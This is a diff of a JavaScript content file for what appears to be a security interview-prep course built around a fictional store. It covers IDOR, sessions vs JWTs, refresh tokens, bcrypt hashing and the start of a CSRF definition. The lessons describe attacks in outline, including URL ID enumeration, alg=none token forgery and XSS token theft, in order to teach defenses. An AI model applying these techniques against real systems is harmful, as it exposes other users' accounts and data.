@@ -29,40 +29,45 @@ const PART3 = {
           icon: "🏪",
           color: "si-green",
           title: "ShopKart Access Control",
-          body: `<div class="diagram-box">ShopKart Roles:
-  CUSTOMER  → can: view own orders, view products, checkout
-  SELLER    → can: manage own product listings, view own store orders
-  ADMIN     → can: view all orders, issue refunds, manage all products
+          body: `<p style="margin-bottom:10px;font-size:13px;">ShopKart's role and resource-level authorization matrix:</p>
 
-Authentication: JWT token contains userId + roles:
-  { "sub": "42", "roles": ["CUSTOMER"], "email": "rahul@example.com" }
+<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
+-- JWT token for Rahul (CUSTOMER):<br/>
+{ sub: "42", roles: ["CUSTOMER"], iat: ..., exp: ... }<br/><br/>
+GET /orders/789:<br/>
+1. Is token valid and not expired? (AuthN ✓)<br/>
+2. Does order 789 belong to userId=42? (AuthZ – ownership) ✓<br/>
+3. If no → 403 Forbidden ← not 401! It's authorization, not authentication<br/><br/>
+PATCH /products/123 (edit product):<br/>
+1. Valid token? (AuthN ✓)<br/>
+2. Does user have SELLER or ADMIN role? (AuthZ – role check)<br/>
+3. If SELLER: does product 123 belong to their store? (AuthZ – ownership)<br/><br/>
+Bug: only checking token validity (AuthN), not ownership (AuthZ)<br/>
+Rahul changes URL: /orders/789 → /orders/790 → sees Priya's order<br/>
+= IDOR vulnerability
+</div>
 
-Authorization Checks:
-  GET /orders/789:
-    ✅ Is request authenticated? Token valid? (AuthN)
-    ✅ Does order 789 belong to userId 42? (AuthZ — ownership check)
-    ✅ If admin, skip ownership check
-    
-  PATCH /products/123 (edit product):
-    ✅ Is request authenticated? (AuthN)
-    ✅ Does user have SELLER or ADMIN role? (AuthZ — role check)
-    ✅ If SELLER, does product 123 belong to their store? (AuthZ — ownership)
+<div style="background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.2);border-left:4px solid #ef4444;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;margin-bottom:12px;">
+  <strong style="color:#ef4444;">🚨 IDOR — Most Common Auth Bug</strong><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">Insecure Direct Object Reference: API authenticates successfully but doesn't verify resource ownership. Always answer: "Does this authenticated user own THIS specific resource?" UUIDs make enumeration harder but are not a substitute for ownership checks.</span>
+</div>
 
-Common Bug (AuthN without AuthZ):
-  GET /orders/789 → only checks token is valid, not ownership
-  Rahul changes URL to /orders/790 → sees another user's order ← IDOR bug!</div>`,
+<div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.25);border-left:4px solid #f59e0b;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
+  <strong style="color:#f59e0b;">🎯 Interview Insight</strong><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">"Users authenticate with JWT tokens. Authorization uses RBAC — each endpoint checks the required role, and resource-scoped endpoints additionally verify the user owns the specific resource they're trying to access. Two separate layers: role check first, ownership check second."</span>
+</div>`,
         },
         {
           icon: "⚠️",
           color: "si-red",
           title: "IDOR — The Most Common AuthZ Bug",
-          body: `<div class="callout danger"><span class="callout-icon">🚨</span><strong>IDOR (Insecure Direct Object Reference)</strong> is the most common authorization vulnerability in web apps. It happens when an API authenticates the user but doesn't check if they own the resource. Always verify: "Does this authenticated user have the right to access THIS specific resource?" Never assume sequential IDs are private — use UUIDs and enforce ownership checks.</div>`,
+          body: `<p style="margin-bottom:12px;">IDOR is the #1 authorization bug in web applications. It appears when route handlers check "is token valid?" (authentication) but skip "does this user own this record?" (authorization). Always verify resource ownership, NOT just token validity. Use 403 for authorization failures, not 401 (which means "not authenticated").</p>`,
         },
         {
           icon: "🎯",
           color: "si-orange",
           title: "Interview Insight",
-          body: `<div class="interview-card"><div class="interview-label">AuthN vs AuthZ</div><div class="interview-q">Always distinguish authentication and authorization in system design. "Users authenticate with JWT tokens. Authorization uses RBAC — each endpoint checks the required role, and resource-scoped endpoints additionally verify the user owns the specific resource (order, address, review) they're trying to access." This two-layer authorization model is what senior engineers implement.</div></div>`,
+          body: `<p style="margin-bottom:12px;">"Users authenticate with JWT tokens. Authorization uses RBAC — each endpoint checks the required role, and resource-scoped endpoints additionally verify the user owns that specific resource. Two layers: role check first (can this user type do this action at all?), then ownership check (does this user own THIS record?)."</p>`,
         },
       ],
     },
@@ -83,26 +88,60 @@ Common Bug (AuthN without AuthZ):
           icon: "🔷",
           color: "si-cyan",
           title: "Step-by-Step Flow",
-          body: `<div class="step-list">
-  <div class="step-item"><div class="step-num">1</div><div class="step-text">Rahul POSTs /auth/login with email + password.</div></div>
-  <div class="step-item"><div class="step-num">2</div><div class="step-text">Server verifies credentials (bcrypt compare). On success, generates a cryptographically random session ID: <code>sess_a3f2b1c4d5e6f7g8</code></div></div>
-  <div class="step-item"><div class="step-num">3</div><div class="step-text">Server stores in Redis: <code>session:sess_a3f2b1c4d5e6f7g8 → {userId: 42, roles: ["CUSTOMER"], loginAt: "...", expiresAt: "..."}</code> with 24h TTL.</div></div>
-  <div class="step-item"><div class="step-num">4</div><div class="step-text">Server sends response with <code>Set-Cookie: sessionId=sess_a3f2b1c4d5e6f7g8; HttpOnly; Secure; SameSite=Strict</code></div></div>
-  <div class="step-item"><div class="step-num">5</div><div class="step-text">Every subsequent request: browser auto-sends cookie. Server reads sessionId, looks up Redis → gets user context. Request processed.</div></div>
-  <div class="step-item"><div class="step-num">6</div><div class="step-text">Logout: DELETE session from Redis → session ID is now worthless. Instant revocation.</div></div>
+          body: `<p style="margin-bottom:10px;font-size:13px;">Session lifecycle — from login to logout:</p>
+
+<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(99,102,241,0.06);font-size:12px;">
+    <div style="font-weight:700;margin-bottom:4px;">🔐 1. Login</div>
+    <code style="font-size:11px;">POST /auth/login → verify credentials via bcrypt</code>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;">
+    <div style="font-weight:700;margin-bottom:4px;">📦 2. Create Session in Redis</div>
+    <code style="font-size:11px;">session:sess_a3f2b1c4 → {userId:42, roles:["CUSTOMER"]} TTL:24h</code>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;">
+    <div style="font-weight:700;margin-bottom:4px;">🍪 3. Send Cookie to Client</div>
+    <code style="font-size:11px;">Set-Cookie: sessionId=sess_a3f2b1c4; HttpOnly; Secure; SameSite=Strict</code>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;">
+    <div style="font-weight:700;margin-bottom:4px;">🔄 4. Each Request</div>
+    <code style="font-size:11px;">Browser sends cookie → server looks up Redis → gets user context (~0.3ms)</code>
+  </div>
+  <div style="padding:12px 16px;font-size:12px;background:rgba(34,197,94,0.05);">
+    <div style="font-weight:700;margin-bottom:4px;">✅ 5. Logout = Instant Revocation</div>
+    <code style="font-size:11px;">DEL session:sess_a3f2b1c4 → session ID is now worthless everywhere, instantly</code>
+  </div>
 </div>`,
         },
         {
           icon: "🔷",
           color: "si-purple",
           title: "Sessions vs JWTs Comparison",
-          body: `<table class="compare-table"><thead><tr><th></th><th>Sessions (Redis)</th><th>JWT Tokens</th></tr></thead><tbody>
-<tr><td><strong>Storage</strong></td><td>Server (Redis)</td><td>Client (localStorage, cookie)</td></tr>
-<tr><td><strong>Revocation</strong></td><td>Instant — delete from Redis</td><td>Hard — must wait for expiry or maintain blocklist</td></tr>
-<tr><td><strong>Scalability</strong></td><td>Requires shared Redis (no problem in practice)</td><td>Stateless — any server can verify</td></tr>
-<tr><td><strong>Size overhead</strong></td><td>Tiny cookie (20 bytes)</td><td>Larger token (200-1000 bytes)</td></tr>
-<tr><td><strong>Best for</strong></td><td>User-facing web apps, when revocation matters</td><td>Microservices auth, mobile apps, third-party API access</td></tr>
-</tbody></table>`,
+          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(99,102,241,0.06);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;font-weight:700;">
+    <div></div><div>Sessions (Redis)</div><div>JWT Tokens</div>
+  </div>
+  <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
+    <div style="font-weight:600;">Storage</div><div>Server (Redis)</div><div>Client (cookie/memory)</div>
+  </div>
+  <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
+    <div style="font-weight:600;">Revocation</div><div style="color:#22c55e;">Instant — delete key</div><div style="color:#f59e0b;">Hard — wait for exp or blocklist</div>
+  </div>
+  <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
+    <div style="font-weight:600;">Scalability</div><div>Shared Redis (fine)</div><div style="color:#22c55e;">Stateless — any server</div>
+  </div>
+  <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
+    <div style="font-weight:600;">Request size</div><div style="color:#22c55e;">~20 byte cookie</div><div>200–400 byte token</div>
+  </div>
+  <div style="padding:10px 16px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
+    <div style="font-weight:600;">Best for</div><div>Web apps, account security</div><div>Microservices, mobile, APIs</div>
+  </div>
+</div>
+
+<div style="background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.25);border-left:4px solid var(--accent);border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
+  <strong style="color:var(--accent);">🏛️ The Architect's Rule</strong><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">"Sessions don't scale" is a myth. Redis handles millions of session lookups per second at ~0.3ms latency — negligible. Sessions win on revocation: instant on logout, instant on compromise. Use sessions for user-facing web apps where you need reliable logout. Use JWTs for microservices where stateless verification across multiple services matters.</span>
+</div>`,
         },
         {
           icon: "🧠",
@@ -123,65 +162,74 @@ Common Bug (AuthN without AuthZ):
           icon: "📖",
           color: "si-blue",
           title: "Simple Definition",
-          body: `<p>A <strong>JWT</strong> (JSON Web Token) is a self-contained token that encodes user information (claims) and is cryptographically signed. Any server with the signing key can verify the token's authenticity without a database lookup. JWTs are stateless — the token IS the session.</p>`,
+          body: `<p style="margin-bottom:12px;">A <strong>JWT</strong> is a self-contained token encoding identity claims, cryptographically signed. Any server with the verification key can validate it without a database lookup. JWTs are stateless — the token itself is the session. Critical security note: the payload is <strong>base64-encoded, not encrypted</strong>. Anyone can decode it. Never put passwords or sensitive data in JWT payload.</p>`,
         },
         {
           icon: "🔍",
           color: "si-purple",
           title: "JWT Structure",
-          body: `<div class="diagram-box">JWT consists of three base64url-encoded parts joined by dots:
-  header.payload.signature
+          body: `<p style="margin-bottom:10px;font-size:13px;">Three parts joined by dots — everything is base64url encoded (NOT encrypted):</p>
 
-Header:  {"alg": "HS256", "typ": "JWT"}
-  → base64url → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
-
-Payload (claims — VISIBLE, NOT encrypted!):
-  {
-    "sub": "42",                    ← subject (user ID)
-    "email": "rahul@example.com",
-    "roles": ["CUSTOMER"],
-    "iat": 1741420800,              ← issued at (unix timestamp)
-    "exp": 1741507200               ← expires at (24h later)
-  }
-  → base64url → eyJzdWIiOiI0MiIsInJvbGVzIjp...
-
-Signature: HMACSHA256(header + "." + payload, SECRET_KEY)
-  → ensures no one tampered with the payload
-
-Full token: eyJhbGc...eyJzdWI...signature
-
-⚠️ CRITICAL: JWT payload is ENCODED, not ENCRYPTED.
-Anyone can decode it. Never put passwords or sensitive data in JWT.
-The signature only proves it hasn't been tampered with.</div>`,
+<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
+header.payload.signature<br/><br/>
+Header: {"alg": "HS256", "typ": "JWT"}<br/>
+Payload (VISIBLE — NOT secret!):<br/>
+{<br/>
+  "sub": "42", &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// user ID<br/>
+  "roles": ["CUSTOMER"],<br/>
+  "email": "rahul@example.com",<br/>
+  "iat": 1741420800,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// issued at<br/>
+  "exp": 1741507200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// expires in 24h<br/>
+}<br/>
+Signature: HMACSHA256(header+"."+payload, SECRET_KEY)<br/>
+→ proves no one tampered with the payload<br/><br/>
+⚠️ JWT payload is ENCODED, not ENCRYPTED.<br/>
+Anyone can run atob() and read every field.<br/>
+NEVER put passwords, SSNs, or secrets in JWT payload.
+</div>`,
         },
         {
           icon: "🏪",
           color: "si-green",
           title: "ShopKart JWT Flow",
-          body: `<div class="step-list">
-  <div class="step-item"><div class="step-num">1</div><div class="step-text">Rahul logs in → server creates JWT signed with RS256 (private key). Returns token to client.</div></div>
-  <div class="step-item"><div class="step-num">2</div><div class="step-text">Client stores JWT in secure HttpOnly cookie (not localStorage — XSS risk).</div></div>
-  <div class="step-item"><div class="step-num">3</div><div class="step-text">Every API request: client sends JWT in Authorization header: <code>Authorization: Bearer eyJhbGc...</code></div></div>
-  <div class="step-item"><div class="step-num">4</div><div class="step-text">Each microservice (Order Service, Payment Service) independently verifies the JWT using the public key. No Redis lookup needed. No central auth server needed for every request.</div></div>
-  <div class="step-item"><div class="step-num">5</div><div class="step-text">Token expires (exp claim). Client must re-authenticate or use refresh token.</div></div>
+          body: `<p style="margin-bottom:10px;font-size:13px;">JWT flow across ShopKart's microservices:</p>
+
+<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;"><span style="font-weight:700;">🔐 Login</span> → Auth Service signs JWT with RS256 private key</div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;"><span style="font-weight:700;">🍪 Cookie</span> → Token stored in HttpOnly cookie (NOT localStorage — XSS risk)</div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;"><span style="font-weight:700;">&#9889; API calls</span> → <code>Authorization: Bearer eyJhbGc...</code></div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;"><span style="font-weight:700;">🔧 Microservice verification</span> → Order Service, Payment Service each verify JWT with public key. No Redis lookup. No round-trip to Auth Service.</div>
+  <div style="padding:12px 16px;font-size:12px;"><span style="font-weight:700;">&#8987; Expiry</span> → Token expires (exp claim). Client uses refresh token for new access token silently.</div>
 </div>`,
         },
         {
           icon: "⚠️",
           color: "si-red",
           title: "Critical JWT Vulnerabilities",
-          body: `<div class="key-list">
-  <div class="key-item"><div class="key-bullet">❌</div><div><strong>alg=none attack.</strong> Old libraries accepted tokens with "alg": "none" — no signature required. Always explicitly specify and enforce the allowed algorithm. Never trust the algorithm from the token header.</div></div>
-  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Storing JWT in localStorage.</strong> XSS attack can read localStorage with one line of JavaScript. Use HttpOnly cookies — JavaScript cannot read them.</div></div>
-  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Long expiry without refresh tokens.</strong> A 30-day JWT cannot be revoked if the user logs out or account is compromised. Use short expiry (15 minutes) + refresh tokens.</div></div>
-  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Weak secret key.</strong> HMAC-SHA256 with a short or guessable secret can be brute-forced offline. Use RS256 (asymmetric) for production or a 256-bit+ random secret for HS256.</div></div>
+          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;font-size:13px;color:#ef4444;margin-bottom:4px;">❌ alg=none attack</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Old JWT libraries accepted tokens with <code>"alg":"none"</code> — no signature verification. Attacker crafts a token with any userId. Always explicitly allowlist algorithms server-side. Never trust the algorithm specified in the token header.</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;font-size:13px;color:#ef4444;margin-bottom:4px;">❌ JWT in localStorage</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Any XSS vulnerability reads localStorage with one line. HttpOnly cookies cannot be read by JavaScript — even a successful XSS can't steal the token.</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;font-size:13px;color:#ef4444;margin-bottom:4px;">❌ Long expiry without refresh tokens</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">A 30-day JWT cannot be revoked. Use 15-minute access tokens + 7-day refresh tokens stored in Redis for revocation.</p>
+  </div>
+  <div style="padding:12px 16px;background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;font-size:13px;color:#ef4444;margin-bottom:4px;">❌ Weak HS256 secret</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">HMAC-SHA256 with a short secret can be brute-forced offline from any captured token. Use RS256 (asymmetric) or a randomly generated 256-bit+ secret.</p>
+  </div>
 </div>`,
         },
         {
           icon: "🎯",
           color: "si-orange",
           title: "Interview Insight",
-          body: `<div class="interview-card"><div class="interview-label">JWT Best Practices</div><div class="interview-q">When choosing JWT vs sessions: "For microservices, JWTs enable stateless verification — each service validates the token without calling a central auth service. We use RS256 so each service only needs the public key. Access tokens expire in 15 minutes; refresh tokens (stored in HttpOnly cookie) are valid 7 days and are stored in Redis for instant revocation." This covers both the why and the security considerations.</div></div>`,
+          body: `<p style="margin-bottom:12px;">"For microservices, JWTs enable stateless verification — each service validates the token without calling a central auth service. We use RS256: Auth Service holds the private key, every other service only needs the public key. Access tokens expire in 15 minutes; refresh tokens (HttpOnly cookie) valid 7 days and stored in Redis for instant revocation. Compromised account: delete all refresh tokens from Redis, all access tokens expire naturally in &lt;15 min."</p>`,
         },
       ],
     },
@@ -202,31 +250,29 @@ The signature only proves it hasn't been tampered with.</div>`,
           icon: "🔷",
           color: "si-cyan",
           title: "Two-Token Flow",
-          body: `<div class="diagram-box">Login:
-  POST /auth/login → email + password
-  Response:
-    access_token: eyJhbGc...  (JWT, expires in 15 min) → stored in memory
-    refresh_token: rt_a3f2b1c4...  (opaque, 7 days)   → stored in HttpOnly cookie
+          body: `<p style="margin-bottom:10px;font-size:13px;">Two-token dance: short-lived access for security, long-lived refresh for UX:</p>
 
-Normal API calls (next 15 minutes):
-  GET /orders → Authorization: Bearer {access_token} ✅
+<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
+Login response:<br/>
+  access_token: eyJhbGc...&nbsp; (JWT, exp:15min) → stored in JS memory<br/>
+  refresh_token: rt_a3f2b1c4... (opaque, 7days) → HttpOnly cookie<br/><br/>
+Normal API calls (next 15 min):<br/>
+  GET /orders → Authorization: Bearer {access_token} ✅<br/><br/>
+Access token expires:<br/>
+  GET /orders → 401 Unauthorized<br/>
+  → Auto: POST /auth/refresh (refresh_token sent via cookie)<br/>
+  → Server: is this token in Redis? Not revoked? → issue new JWT<br/>
+  → Retry: GET /orders → ✅ (user never notices)<br/><br/>
+Logout:<br/>
+  DELETE refresh_token from Redis<br/>
+  → access_token expires naturally in ≤15 min<br/>
+  → No further refresh possible → fully logged out
+</div>
 
-After 15 minutes, access token expires:
-  GET /orders → 401 Unauthorized (token expired)
-  
-Automatic token refresh (silent, user doesn't notice):
-  POST /auth/refresh → refresh_token (from HttpOnly cookie)
-  Server checks: Is this refresh token in Redis? Not revoked?
-  If valid → issues new access_token (new 15 min JWT)
-  Retry original request → ✅
-
-Logout:
-  POST /auth/logout → server deletes refresh_token from Redis
-  Both tokens now useless (access token expires naturally in ≤15 min)
-
-Security benefit:
-  If access token is stolen → attacker can use it for max 15 minutes
-  Then it's worthless (can't refresh — they don't have the refresh token cookie)</div>`,
+<div style="background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.25);border-left:4px solid var(--accent);border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
+  <strong style="color:var(--accent);">🏛️ The Architect's Rule</strong><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">Access token in memory (lost on page refresh, invisible to XSS). Refresh token in HttpOnly cookie (auto-sent by browser, invisible to JavaScript, protected from CSRF with SameSite=Strict). Never in localStorage — any XSS vulnerability in any package on your page steals every user's token permanently.</span>
+</div>`,
         },
         {
           icon: "🧠",
@@ -252,74 +298,79 @@ Security benefit:
           icon: "📖",
           color: "si-blue",
           title: "Simple Definition",
-          body: `<p><strong>Password hashing</strong> is a one-way transformation of a password into a fixed-length string (hash). The original password cannot be recovered from the hash. When Rahul logs in, ShopKart hashes his input and compares it to the stored hash — the actual password is never stored anywhere. If ShopKart's database is stolen, attackers get hashes, not passwords.</p>`,
+          body: `<p style="margin-bottom:12px;">A <strong>password hash</strong> is a one-way transformation: the original password can never be recovered from it. When Rahul logs in, ShopKart hashes his input and compares to the stored hash. The actual password is never stored anywhere. If the database is stolen, attackers get hashes, not passwords. With bcrypt: hashes are computationally expensive to reverse (intentional design).</p>`,
         },
         {
           icon: "🔍",
           color: "si-purple",
           title: "Why Simple Hashing is Not Enough",
-          body: `<div class="diagram-box">❌ WRONG — Plain hash (MD5, SHA-1, SHA-256):
-  password: "shopkart123"
-  SHA-256:  "2c624232cdd221771294dfbb310aca000a0df6ac..."
-  
-  Problem 1 — Rainbow Tables:
-  Attacker pre-computes hashes for ALL common passwords.
-  "shopkart123" is common → they already have its SHA-256 hash.
-  Instant crack without brute force.
-  
-  Problem 2 — Speed:
-  SHA-256 computes 1 billion hashes/second on modern GPU.
-  Brute force all 8-char passwords: minutes.
-  
-✅ CORRECT — Adaptive hashing with salt (bcrypt, Argon2, scrypt):
-  password: "shopkart123"
-  + random salt: "x9f2b3c4d5e6f7g8" (stored with hash)
-  bcrypt(password + salt, cost=12)
-  = "$2b$12$x9f2b3c4d5e6f7g8MK8..."
-  
-  bcrypt at cost=12: 250ms per hash → 4 hashes/second
-  GPU brute force: still only 4 hashes/second (bcrypt is intentionally slow)
-  Rainbow tables: useless (unique salt per user)</div>`,
+          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
+  <div style="padding:14px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;font-size:14px;color:#ef4444;margin-bottom:6px;">❌ Plain Hash (MD5/SHA-256) — NEVER use for passwords</div>
+    <div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);">
+SHA-256("shopkart123") = "2c624232cdd2..."
+<br/>Problem 1: Attacker pre-computes ALL common password hashes (rainbow table). "shopkart123" is common → instant crack.<br/>Problem 2: GPU computes 1 billion SHA-256/second. Brute-force 8-char passwords: minutes.
+    </div>
+  </div>
+  <div style="padding:14px 16px;background:rgba(34,197,94,0.06);">
+    <div style="font-weight:700;font-size:14px;color:#22c55e;margin-bottom:6px;">✅ Adaptive Hash (bcrypt/Argon2) — correct</div>
+    <div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);">
+bcrypt("shopkart123", cost=12) = "$2b$12$x9f2b3c4..."← ~250ms<br/>Random salt per user → rainbow tables useless<br/>cost=12: intentionally slow. GPU = still only 4 hashes/sec.<br/>Brute-force 8-char passwords: years, not minutes.
+    </div>
+  </div>
+</div>`,
         },
         {
           icon: "🏪",
           color: "si-green",
           title: "ShopKart Password Implementation",
-          body: `<div class="diagram-box">Registration:
-  Rahul sets password: "mySecurePass123!"
-  
-  1. Generate random 16-byte salt: crypto.randomBytes(16)
-  2. bcrypt.hash(password, 12) → bcrypt internally handles salt
-  3. Store ONLY the hash: "$2b$12$KixKGbGGstZmC4YG..."
-  4. Never store the plaintext password. Never.
+          body: `<p style="margin-bottom:10px;font-size:13px;">ShopKart's complete password lifecycle:</p>
 
-Login Verification:
-  Rahul enters: "mySecurePass123!"
-  1. Fetch stored hash from DB for rahul@example.com
-  2. bcrypt.compare("mySecurePass123!", storedHash) → true/false
-  3. Returns boolean — doesn't reveal the original password
-
-Password Reset (critical — do NOT email passwords):
-  1. Generate a cryptographically random reset token (UUID v4)
-  2. Store hash of reset token + expiry (15 min) in DB
-  3. Email the TOKEN (not the hash) as URL: /reset?token=...
-  4. On reset page: verify token hash, accept new password, hash it, delete token</div>`,
+<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
+-- Registration:<br/>
+bcrypt.hash("mySecurePass123!", 12)<br/>
+→ store ONLY the hash<br/>
+→ never store plaintext<br/><br/>
+-- Login verification:<br/>
+bcrypt.compare(inputPassword, storedHash)<br/>
+→ returns boolean (doesn't reveal original password)<br/><br/>
+-- Password Reset (safe approach):<br/>
+1. Generate random reset token (UUID v4)<br/>
+2. Store HASH of token + expiry (15 min) in DB<br/>
+3. Email the TOKEN (not the hash) in URL: /reset?token=uuid<br/>
+4. On reset: verify token hash, accept new password, hash it, delete token<br/><br/>
+-- NEVER: email passwords, log passwords, store plaintext
+</div>`,
         },
         {
           icon: "⚠️",
           color: "si-red",
           title: "Critical Mistakes",
-          body: `<div class="key-list">
-  <div class="key-item"><div class="key-bullet">❌</div><div><strong>MD5 or SHA-1 for passwords.</strong> These are fast hashing algorithms designed for checksums, not password storage. Both are completely broken for password use in milliseconds.</div></div>
-  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Storing plaintext passwords anywhere.</strong> Not in DB, not in logs, not in emails. Ever. When a user resets their password, email a reset link — never their current or new password.</div></div>
-  <div class="key-item"><div class="key-bullet">❌</div><div><strong>Using SHA-256 without salt.</strong> Identical passwords produce identical hashes — one cracked hash cracks all users with the same password.</div></div>
+          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:14px;">
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;color:#ef4444;margin-bottom:4px;font-size:13px;">❌ MD5 or SHA-1 for passwords</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;">Fast algorithms designed for checksums. Both completely broken for password storage — cracked in milliseconds.</p>
+  </div>
+  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;color:#ef4444;margin-bottom:4px;font-size:13px;">❌ Storing plaintext passwords anywhere</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;">Not in DB, not in logs, not in emails. When a user resets their password, email a reset LINK (token) — never their current or new password.</p>
+  </div>
+  <div style="padding:12px 16px;background:rgba(239,68,68,0.05);">
+    <div style="font-weight:700;color:#ef4444;margin-bottom:4px;font-size:13px;">❌ SHA-256 without per-user salt</div>
+    <p style="margin:0;font-size:12px;opacity:0.85;">Identical passwords produce identical hashes. One cracked hash reveals all users with that password. bcrypt auto-generates unique salt per hash.</p>
+  </div>
+</div>
+
+<div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.25);border-left:4px solid #f59e0b;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
+  <strong style="color:#f59e0b;">🎯 Interview Insight</strong><br/>
+  <span style="color:var(--text-primary);opacity:0.9;">Always specify bcrypt or Argon2 (never MD5/SHA for passwords): "We hash with bcrypt at cost factor 12 — intentionally 250ms per hash which prevents brute force. bcrypt auto-generates unique salt per user, preventing rainbow table attacks." This specificity demonstrates real security knowledge.</span>
 </div>`,
         },
         {
           icon: "🎯",
           color: "si-orange",
           title: "Interview Insight",
-          body: `<div class="interview-card"><div class="interview-label">Password Security</div><div class="interview-q">Always specify bcrypt or Argon2 (never MD5/SHA for passwords) when asked about user authentication. "We hash passwords with bcrypt at cost factor 12 — intentionally slow at 250ms per hash, which prevents brute force. Salts are auto-generated per user by bcrypt, preventing rainbow table attacks." This level of specificity shows real security knowledge.</div></div>`,
+          body: `<p style="margin-bottom:12px;">"We hash passwords with bcrypt at cost factor 12 — intentionally slow at 250ms per hash, which makes brute force infeasible. bcrypt auto-generates unique salt per user, preventing rainbow table attacks. Password resets use a time-limited random token emailed as a URL — we never email passwords or store plaintext anywhere."</p>`,
         },
       ],
     },
@@ -334,43 +385,56 @@ Password Reset (critical — do NOT email passwords):
           icon: "📖",
           color: "si-blue",
           title: "Simple Definition",
-          body: `<p><strong>CSRF</strong> (Cross-Site Request Forgery) is an attack where a malicious website tricks Rahul's browser into making an authenticated request to ShopKart using his real cookies. Since the browser automatically includes cookies, ShopKart can't distinguish Rahul's genuine request from a forged one originating from evil-site.com.</p>`,
